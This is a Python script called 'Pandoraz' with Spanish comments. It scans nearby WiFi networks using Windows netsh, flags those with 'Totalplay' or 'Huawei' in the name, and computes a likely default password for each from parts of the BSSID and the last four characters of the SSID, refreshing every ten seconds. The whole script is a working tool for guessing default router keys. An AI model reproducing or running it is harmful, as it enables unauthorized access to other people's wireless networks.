# -*- Coding: UTF-8 -*-
# Python 3
#
#   ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
#   ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
#   ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
#   ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
#   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
#                                                         By: LawlietJH
#                                                               v1.1.0

import time
import os



Version = "v1.1.0"



# Banners: http://patorjk.com/software/taag/



Banner1 = """
       ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
       ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
       ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
       ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
       ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
       ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""
# Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz


Banner2 = """
                            ╔═╗┌─┐┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐
                            ╠═╝├─┤│││ │││ │├┬┘├─┤┌─┘
                            ╩  ┴ ┴┘└┘─┴┘└─┘┴└─┴ ┴└─┘
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=Pandoraz

Autor = """
                            ╦  ┌─┐┬ ┬┬  ┬┌─┐┌┬┐╦╦ ╦
                            ║  ├─┤││││  │├┤  │ ║╠═╣
                            ╩═╝┴ ┴└┴┘┴─┘┴└─┘ ┴╚╝╩ ╩
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=LawlietJH



#=======================================================================



def Dat():	# Función Que Permite Mostrar Los Datos Del Script.
	
	os.system("cls && Title IpMac.py                "+\
			"By: LawlietJH                "+Version+"    ")
	print("\n\n", Banner1)
	print("\n\n", Autor)
	print("\n{:^80}".format(Version))
	
	os.system("TimeOut /NoBreak 1 > Nul")
	


#=======================================================================


Red = False
Redes = []
Bssids = []
Cont = 0
Cony = 0
Conty = 0



#=======================================================================




def Salir(Num=0):	# Fucnión Que Permite Salir Del Script Sin Error Alguno.
	
	try:
		time.sleep(1.5)
		exit(Num)
	except KeyboardInterrupt:
		Salir(Num)



def Redes():
	
	pass




def EscaneoDeRed():	# Escaneo De La Red En Busqueda De Redes WiFi Vulnerables.
	
	global Bssids, Redes, Red, Cont, Cony, Conty
	Bssids, Redes, Red, Cont, Cony, Conty = [], [], [], 0, 0, 0
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cad = os.popen(Comando)
	Cadena = Cad.read()
	Lista = Cadena.split("\n")

	for X in Lista:
		
		Conty += 1
		
		if Conty == 3:
			print("\n\n\n\t [+] ", X, "\n\n")
		
		if "SSID" in X:
			X = X.split(" : ")[1]			
			Bssids.append(X)

	for Y in Bssids:
		
		if Cont % 2 == 0:
			
			Cony += 1
			
			if len(Y) > 12:	print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t")
			else:			print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t\t")
				
			if "Totalplay" in Y or "Huawei" in Y:
				Red = True
				Redes.append(Y)
		else:
			Y = Y.upper()
			print(" BSSID: {}".format(Y))
			
			if Red == True:
				Redes.append(Y)
				Red = False
		
		Cont += 1
	
	Cont = 0
	Cony = 0
	Name = ""
	Pass = ""
	
	if len(Redes) != 0:
		print("\n\n\n\n Posibles Contraseñas De Redes:\n")
		
		for X in Redes:
			
			Cont += 1
						
			if Cont % 2 != 0:
				
				Cony += 1
				
				Name = X
				
				print("\n [*] {} - Red: {}".format(Cony, X), end="\t")
			
			else:
				
				Name = Name[-4:]
				X = X.split(":")
				Pass = X[3] + X[4] + Name
				
				print("\t Contraseña: {}".format(Pass))
				
	else: print("\n\n\t [!] Sin Redes Disponibles... Por Ahora...")



#=======================================================================



while True:
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	
	EscaneoDeRed()
	
	Eny = 10
	
	print("\n\n")
	
	try:
		while True:
			 
			print("\r\t Actualizado En " + str(Eny) + " Segundos...", end="")
			os.system("TimeOut /NoBreak 1 > Nul")
			
			if Eny == 1: break
			
			Eny -= 1
	except KeyboardInterrupt:
		print("\n\n\t [!] Saliendo...")
		time.sleep(1.5)
		Dat()
		Salir(0)
		
